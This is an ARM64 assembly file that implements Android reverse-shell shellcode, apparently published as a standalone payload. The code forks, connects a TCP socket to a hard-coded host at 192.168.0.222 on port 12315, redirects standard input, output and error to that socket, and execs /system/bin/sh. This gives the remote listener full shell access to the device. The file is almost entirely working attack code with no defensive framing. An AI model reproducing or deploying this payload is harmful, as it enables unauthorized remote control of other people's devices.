/* @idhyt
    android arm64 shell_reverse_tcp
    parameters      x0-x7
    system call     x8
*/

.global _start

_start:

    # clone
    mov             x8, #220
    svc             0 
    cbz             w0, _child
    # exit parent
    mov             x0, #0
    mov             x8, #93
    svc             0

_child:
    /* socket(AF_INET, SOCK_STREAM, IPPROTO_IP) */
    mov     x2, 0
    mov     x1, 1
    mov     x0, 2
    mov     x8, 198
    svc     0

    mov     w3, w0

    /* connect(sockfd, &addr, 16) */
    mov     x2, 16
    adr     x1, struct_addr
    mov     x8, 203
    svc     0

    /* dup3(sockfd, STDIN_FILENO/STDOUT_FILENO/STDERR_FILENO, 0) */
    mov     w0, w3
    mov     x1, #0
    mov     x2, #0
    mov     x8, 24
    svc     0

    mov     w0, w3
    mov     x1, #1
    mov     x2, #0
    mov     x8, 24
    svc     0

    mov     w0, w3
    mov     x1, #2
    mov     x2, #0
    mov     x8, 24
    svc     0

    /* execve("/bin/sh", NULL, NULL) */
    adr     x0, shell
    mov     x1, #0
    mov     x2, #0
    mov     x8, 221
    svc     0

struct_addr:
    # AF_INET = 2 for IPv4
    .short  0x2
    # port 12315
    .short  0x1B30
    # ip
    .byte   192,168,0,222
    .short  0x7444
    .short  0xB6EE
    .short  0x3
    .short  0

shell:
    .ascii "/system/bin/sh\0"
